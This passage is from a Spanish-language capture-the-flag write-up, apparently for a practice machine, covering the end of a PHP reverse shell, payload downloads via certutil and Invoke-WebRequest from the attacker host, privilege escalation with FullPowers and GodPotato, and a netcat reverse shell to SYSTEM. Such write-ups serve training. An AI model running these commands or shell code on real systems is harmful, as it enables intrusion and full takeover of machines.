</span></span></span><span class=line><span class=cl><span class=c1></span>                                <span class=k>if</span> <span class=p>((</span><span class=nv>$fstat</span> <span class=o>=</span> <span class=nx>fstat</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>]))</span> <span class=o>&amp;&amp;</span> <span class=nv>$fstat</span><span class=p>[</span><span class=s1>&#39;size&#39;</span><span class=p>])</span> <span class=p>{</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>brw</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=nv>$socket</span>  <span class=p>,</span> <span class=s1>&#39;STDERR&#39;</span><span class=p>,</span> <span class=s1>&#39;SOCKET&#39;</span><span class=p>);</span> <span class=p>}</span> <span class=c1>// read from STDERR and write to SOCKET
</span></span></span><span class=line><span class=cl><span class=c1></span>                                <span class=k>if</span> <span class=p>((</span><span class=nv>$fstat</span> <span class=o>=</span> <span class=nx>fstat</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span> <span class=o>&amp;&amp;</span> <span class=nv>$fstat</span><span class=p>[</span><span class=s1>&#39;size&#39;</span><span class=p>])</span> <span class=p>{</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>brw</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$socket</span>  <span class=p>,</span> <span class=s1>&#39;STDOUT&#39;</span><span class=p>,</span> <span class=s1>&#39;SOCKET&#39;</span><span class=p>);</span> <span class=p>}</span> <span class=c1>// read from STDOUT and write to SOCKET
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=p>}</span>
</span></span><span class=line><span class=cl>                        <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=o>!</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=c1>// ------ WORK END ------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>                    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$pipes</span> <span class=k>as</span> <span class=nv>$pipe</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=nx>fclose</span><span class=p>(</span><span class=nv>$pipe</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=nx>proc_close</span><span class=p>(</span><span class=nv>$process</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=c1>// ------ SHELL END ------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>                <span class=nx>fclose</span><span class=p>(</span><span class=nv>$socket</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=c1>// ------ SOCKET END ------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1>// change the host address and/or port number as necessary
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$sh</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Shell</span><span class=p>(</span><span class=s1>&#39;10.10.16.6&#39;</span><span class=p>,</span> <span class=mi>4000</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$sh</span><span class=o>-&gt;</span><span class=na>run</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>unset</span><span class=p>(</span><span class=nv>$sh</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// garbage collector requires PHP v5.3.0 or greater
</span></span></span><span class=line><span class=cl><span class=c1>// @gc_collect_cycles();
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>donde, de nuevo, <code>10.10.16.6</code> es mi IP de atacante y <code>4000</code> es el puerto con el que escuchar√© con <code>nc</code>.</p><ul><li>Empiezo un servidor <code>Python</code> <code>HTTP</code> en el puerto <code>80</code> en el mismo directorio donde <code>revshell.php</code> est√° localizado</li><li>Empiezo un listener de <code>nc</code> en el puerto <code>4000</code>. Luego, en la reverse shell obtenida con <code>Nishang</code> corro lo siguiente:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Windows\Temp\8f8177df5fbf8e4d3d0385b74ece7f\trying media&gt; Invoke-WebRequest -Uri http://10.10.16.6/revshell.php -OutFile C:\xampp\htdocs\uploads\revshell.php
</span></span></span></code></pre></div><p>y escribo los archivos donde usualmente el servidor <code>HTTP</code> est√° localizado en <code>Windows</code>, en <code>C:\xampp\htdocs</code>.</p><ul><li>Finalmente, puedo activar la reverse shell con:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>curl http://10.10.11.234/uploads/revshell.php
</span></span></span></code></pre></div><p>y obtengo la reverse shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>rlwrap nc -lvnp 4000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 4000 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.234] 49691
</span></span></span><span class=line><span class=cl><span class=go>SOCKET: Shell has connected! PID: 4352
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.17763.4851]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\xampp\htdocs\uploads&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go>nt authority\local service
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\xampp\htdocs\uploads&gt;
</span></span></span></code></pre></div><p>pero ahora, tal cual se puede ver, somos el usuario <code>nt authority\local service</code>.</p><ul><li>Desde la nueva reverse shell, descargo <code>FullPowers</code> desde su <a href=https://github.com/itm4n/FullPowers class=external-link target=_blank rel=noopener>repositorio oficial</a> usando <code>certutil</code> (luego de empezar, de nuevo, un servidor <code>Python</code> <code>HTTP</code> en el puerto <code>80</code>):</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Windows\Temp&gt;cd C:\Users\Public\Downloads
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\Public\Downloads&gt;certutil.exe -urlcache -split -f http://10.10.16.6/FullPowers.exe .\FullPowers.exe
</span></span></span><span class=line><span class=cl><span class=go>****  Online  ****
</span></span></span><span class=line><span class=cl><span class=go>  0000  ...
</span></span></span><span class=line><span class=cl><span class=go>  9000
</span></span></span><span class=line><span class=cl><span class=go>CertUtil: -URLCache command completed successfully.
</span></span></span></code></pre></div><p>y pasamos de esto:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;whoami /priv
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PRIVILEGES INFORMATION
</span></span></span><span class=line><span class=cl><span class=go>----------------------
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Privilege Name                Description                    State
</span></span></span><span class=line><span class=cl><span class=go>============================= ============================== ========
</span></span></span><span class=line><span class=cl><span class=go>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeCreateGlobalPrivilege       Create global objects          Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
</span></span></span></code></pre></div><p>a esto:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;.\FullPowers.exe
</span></span></span><span class=line><span class=cl><span class=go>[+] Started dummy thread with id 1888
</span></span></span><span class=line><span class=cl><span class=go>[+] Successfully created scheduled task.
</span></span></span><span class=line><span class=cl><span class=go>[+] Got new token! Privilege count: 7
</span></span></span><span class=line><span class=cl><span class=go>[+] CreateProcessAsUser() OK
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.17763.4851]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Windows\system32&gt;whoami /priv
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PRIVILEGES INFORMATION
</span></span></span><span class=line><span class=cl><span class=go>----------------------
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Privilege Name                Description                               State
</span></span></span><span class=line><span class=cl><span class=go>============================= ========================================= =======
</span></span></span><span class=line><span class=cl><span class=go>SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeAuditPrivilege              Generate security audits                  Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeImpersonatePrivilege        Impersonate a client after authentication Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeCreateGlobalPrivilege       Create global objects                     Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
</span></span></span></code></pre></div><p>de manera que el privilegio <code>SeImpersonatePrivilege</code> ahora est√° activado, el cual puede ser usado para escalar privilegios.</p><ul><li>Notamos que luego de ejecutar <code>FullPowers</code> ahora nos encontramos en el directorio <code>C:\Windows\system32</code>, de manera que me muevo a un directorio donde s√≠ pueda escribir archivos como, por ejemplo, <code>C:\Users\Public\Desktop\Downloads</code>.</li><li>Finalmente, paso un binario de <code>netcat</code> para <code>Windows</code>, y <code>JuicyPotato</code> usando <code>certutil</code> para abusar <code>SeImpersonatePrivilege</code>. Pero no funcion√≥ (de manera que no es necesario que pierdan su tiempo como yo).</li><li>Luego, intentar√© usar <code>GodPotato</code> en vez de <code>JuicyPotato</code>. Descargamos esto desde su <a href=https://github.com/BeichenDream/GodPotato class=external-link target=_blank rel=noopener>repositorio de Github</a>; pero tenemos diferentes binarios para descargar para distintas versiones de <code>.NET</code>. Para saber cu√°l versi√≥n descargar corro el siguiente comando en la m√°quina v√≠ctima:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;reg query &#34;HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\CDF
</span></span></span><span class=line><span class=cl><span class=go>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4
</span></span></span><span class=line><span class=cl><span class=go>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4.0
</span></span></span></code></pre></div><p>de manera que descargamos la versi√≥n <code>NET4</code>.</p><ul><li>Una vez descargado el ejecutable, lo paso a la m√°quina v√≠ctima y chequeo si funciona:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;certutil.exe -urlcache -split -f http://10.10.16.6/godpotato-net4.exe .\godpotato.exe
</span></span></span><span class=line><span class=cl><span class=go>****  Online  ****
</span></span></span><span class=line><span class=cl><span class=go>  0000  ...
</span></span></span><span class=line><span class=cl><span class=go>  e000
</span></span></span><span class=line><span class=cl><span class=go>CertUtil: -URLCache command completed successfully.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\Public\Downloads&gt;.\godpotato -cmd &#34;cmd /c whoami&#34;
</span></span></span><span class=line><span class=cl><span class=go>[*] CombaseModule: 0x140715858722816
</span></span></span><span class=line><span class=cl><span class=go>[*] DispatchTable: 0x140715861028976
</span></span></span><span class=line><span class=cl><span class=go>[*] UseProtseqFunction: 0x140715860405152
</span></span></span><span class=line><span class=cl><span class=go>[*] UseProtseqFunctionParamCount: 6
</span></span></span><span class=line><span class=cl><span class=go>[*] HookRPC
</span></span></span><span class=line><span class=cl><span class=go>[*] Start PipeServer
</span></span></span><span class=line><span class=cl><span class=go>[*] CreateNamedPipe \\.\pipe\79e3465c-95bf-41d8-9539-53f788c911a2\pipe\epmapper
</span></span></span><span class=line><span class=cl><span class=go>[*] Trigger RPCSS
</span></span></span><span class=line><span class=cl><span class=go>[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
</span></span></span><span class=line><span class=cl><span class=go>[*] DCOM obj IPID: 00009802-10ac-ffff-d1e0-c475845222f4
</span></span></span><span class=line><span class=cl><span class=go>[*] DCOM obj OXID: 0xf22c1c8cc040bd7
</span></span></span><span class=line><span class=cl><span class=go>[*] DCOM obj OID: 0xa93e722cc15a4aa
</span></span></span><span class=line><span class=cl><span class=go>[*] DCOM obj Flags: 0x281
</span></span></span><span class=line><span class=cl><span class=go>[*] DCOM obj PublicRefs: 0x0
</span></span></span><span class=line><span class=cl><span class=go>[*] Marshal Object bytes len: 100
</span></span></span><span class=line><span class=cl><span class=go>[*] UnMarshal Object
</span></span></span><span class=line><span class=cl><span class=go>[*] Pipe Connected!
</span></span></span><span class=line><span class=cl><span class=go>[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
</span></span></span><span class=line><span class=cl><span class=go>[*] CurrentsImpersonationLevel: Impersonation
</span></span></span><span class=line><span class=cl><span class=go>[*] Start Search System Token
</span></span></span><span class=line><span class=cl><span class=go>[*] PID : 884 Token:0x644  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
</span></span></span><span class=line><span class=cl><span class=go>[*] Find System Token : True
</span></span></span><span class=line><span class=cl><span class=go>[*] UnmarshalObject: 0x80070776
</span></span></span><span class=line><span class=cl><span class=go>[*] CurrentUser: NT AUTHORITY\SYSTEM
</span></span></span><span class=line><span class=cl><span class=go>[*] process start with pid 1692
</span></span></span><span class=line><span class=cl><span class=go>nt authority\system
</span></span></span></code></pre></div><p>y funciona. De manera que ahora me env√≠o una reverse shell a mi m√°quina atacante usando el binario de <code>netcat</code> para Windows que ya hab√≠a subido cuando intent√© correr <code>JuicyPotato</code> (pero fall√©).</p><ul><li>Empiezo un listener con <code>netcat</code> en el puerto <code>443</code> y en la m√°quina v√≠ctima procedo a correr:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;.\godpotato -cmd &#34;cmd /c C:\Users\Public\Downloads\nc.exe 10.10.16.6 443 -e cmd&#34;
</span></span></span></code></pre></div><p>y obtengo una reverse shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.234] 49726
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.17763.4851]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\Public\Downloads&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>nt authority\system
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\Public\Downloads&gt;
</span></span></span></code></pre></div><p>Finalmente, podemos leer la flag en el escritorio del usuario Administrator.</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>